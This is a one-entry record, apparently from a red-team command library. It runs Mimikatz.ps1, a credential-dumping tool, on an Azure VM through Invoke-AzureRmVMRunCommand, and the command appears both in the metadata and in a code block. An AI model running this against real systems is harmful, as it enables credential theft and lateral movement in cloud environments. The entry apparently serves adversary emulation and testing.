---
id: 43873b22-fbaa-4004-9c4f-cd59fdf8a5f7
name: Execute Powershell script on the VM
type: command
executor: bash
data: Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test
  -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
output: null
created_at: '2023-05-28T03:59:38.556507+00:00'
updated_at: '2023-05-28T03:59:38.880779+00:00'
---

# Execute Powershell script on the VM

```bash
Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
```
